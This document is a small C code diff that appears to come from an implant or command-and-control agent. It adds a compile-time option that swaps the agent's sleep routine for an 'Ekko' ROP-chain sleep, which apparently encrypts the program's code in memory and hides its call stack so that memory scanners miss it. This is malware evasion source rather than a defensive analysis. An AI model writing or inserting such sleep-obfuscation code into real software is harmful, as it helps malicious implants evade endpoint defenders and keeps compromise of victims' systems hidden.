@@ -197,8 +197,19 @@ BOOL FoliageInit(void)
  * Memory scanners see encrypted (random-looking) bytes in the .text section.
  * Returns immediately if FoliageInit() was not called or failed.
  */
+/* Forward declaration for Ekko ROP variant (ekko_rop.c) */
+#ifdef SLEEP_EKKO
+extern VOID EkkoObfSleep(DWORD SleepTime);
+#endif
+
 VOID FoliageSleep(DWORD ms)
 {
+#ifdef SLEEP_EKKO
+    /* Use Cracked5pider Ekko NtContinue ROP chain (superior call-stack hiding) */
+    EkkoObfSleep(ms);
+    return;
+#endif
+
     if (!g_Foliage.SystemFunction032) {
         /* graceful fallback to plain sleep */
         Sleep(ms);
